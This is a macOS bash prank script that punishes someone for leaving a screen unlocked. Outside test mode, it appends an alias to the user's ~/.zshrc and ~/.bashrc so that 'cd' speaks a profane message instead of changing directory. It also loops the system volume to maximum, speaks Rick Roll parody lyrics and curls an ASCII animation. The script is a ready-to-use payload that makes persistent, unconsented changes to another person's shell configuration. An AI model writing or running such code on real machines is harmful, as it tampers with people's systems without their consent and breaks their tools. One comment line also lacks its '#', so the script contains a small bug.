#!/bin/bash

current_user=$(whoami)

Check if the username is not "test"
if [ "$1" != "test" ]; then
    echo 'alias cd="osascript -e '\''set Volume 10'\'' && say '\''Lock your fucking screen'\''"' >> ~/.zshrc
    echo 'alias cd="osascript -e '\''set Volume 10'\'' && say '\''Lock your fucking screen'\''"' >> ~/.bashrc
else
    echo "Testmode. Skipping the code."
fi

# Flag to indicate whether to continue the volume loop
volume_loop_flag=true

# Function to set volume to 10 in an endless loop
set_volume_loop() {
    while [ "$volume_loop_flag" = true ]; do
        osascript -e "set Volume 10"
        sleep 0.01  # Adjust sleep time as needed
    done
}

# Run the volume loop in the background
if [ "$1" != "test" ]; then
    set_volume_loop &
	volume_loop_pid=$!
else
    osascript -e "set Volume 0"
fi

# Define the lyrics of the Rick Roll song with pauses
lyrics=(
    "Never gonna lock your screen,"
    "Never gonna let this stop,"
    "Never gonna run around and desert you,"
    "Never gonna make you lock your fucking screen,"
    "Never gonna say goodbye,"
    "Never gonna tell you why you didn't lock your fucking screen"
    "Never gonna leave your desk unsecured,"
    "Never gonna let unauthorized access occur,"
    "Never gonna say 'I forgot to lock my screen,'"
    "Never gonna leave your workstation unattended,"
    "Never gonna let security protocols be suspended,"
    "Never gonna forget to lock your screen,"
    "Never gonna let security become routine"
)


function_name () {
    # Loop through each line of lyrics and use 'say' to vocalize them
    for line in "${lyrics[@]}"; do
        say "$line"
    done

    # Set the flag to false to stop the volume loop
    kill "$volume_loop_pid"
}

# Run the function in the background
if [ "$1" != "test" ]; then
    function_name &
fi

# Wait for the function to finish before continuing
wait

pkill -f "$(basename "$0")"

curl ascii.live/rick

